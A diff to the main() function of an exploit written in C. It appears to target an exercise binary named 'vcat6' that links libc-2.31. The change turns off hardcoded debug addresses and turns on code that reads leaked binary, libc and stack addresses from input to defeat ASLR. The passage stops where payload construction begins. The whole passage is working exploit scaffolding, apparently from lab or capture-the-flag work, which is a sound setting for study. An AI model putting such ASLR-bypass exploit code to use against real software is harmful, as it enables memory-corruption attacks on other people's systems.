@@ -111,35 +111,35 @@ main(int argc, char **argv)
 	memset(buf, 0, BUF_SZ);
 
 	/* DEBUG MODE ONLY: */
-	baddr = 0x41000000;
-	laddr = 0xb7d8d000;
-	staddr = 0xbffffd98;
+	// baddr = 0x41000000;
+	// laddr = 0xb7d8d000;
+	// staddr = 0xbffffd98;
 
 	/* For NON-DEBUG MODE ONLY:	*/
 
 	/* leak the base address of `vcat6'	*/
-	// write(STDOUT_FILENO, FMT_STR, strlen(FMT_STR));
-	// read(STDIN_FILENO, buf, BUF_SZ-1);
-	// baddr = strtoul(buf, NULL, 16) - BIN_BASE_OFF;
+	write(STDOUT_FILENO, FMT_STR, strlen(FMT_STR));
+	read(STDIN_FILENO, buf, BUF_SZ-1);
+	baddr = strtoul(buf, NULL, 16) - BIN_BASE_OFF;
 
-	// /* leak the base address of 'libc-2.31.so'	*/
-	// read(STDIN_FILENO, buf, BUF_SZ-1);
-	// laddr = strtoul(buf, NULL, 16) - LIBC_BASE_OFF;
+	/* leak the base address of 'libc-2.31.so'	*/
+	read(STDIN_FILENO, buf, BUF_SZ-1);
+	laddr = strtoul(buf, NULL, 16) - LIBC_BASE_OFF;
 
-	// /* leak the stack address	*/
-	// read(STDIN_FILENO, buf, BUF_SZ-1);
-	// staddr = strtoul(buf, NULL, 16);
+	/* leak the stack address	*/
+	read(STDIN_FILENO, buf, BUF_SZ-1);
+	staddr = strtoul(buf, NULL, 16);
 
-	// /* sanity check 			*/
-	// if (!fstat(STDIN_FILENO, &istat) && !S_ISFIFO(istat.st_mode)) {
-	// 	if (!baddr || !laddr) {
-	// 		fprintf(stderr,
-	// 			"[-] baddr = 0x%08lx, laddr = 0x%08lx\n", baddr, laddr);
-	// 		fprintf(stderr,
-	// 			"[!] If you are debugging your exploit under GDB "
-	// 			"you need to type in the leaked addresses\n");
-	// 	}
-	// }
+	/* sanity check 			*/
+	if (!fstat(STDIN_FILENO, &istat) && !S_ISFIFO(istat.st_mode)) {
+		if (!baddr || !laddr) {
+			fprintf(stderr,
+				"[-] baddr = 0x%08lx, laddr = 0x%08lx\n", baddr, laddr);
+			fprintf(stderr,
+				"[!] If you are debugging your exploit under GDB "
+				"you need to type in the leaked addresses\n");
+		}
+	}
 
 	/* Time to create the payload!!!!	*/
 	unsigned long addr_aslr;
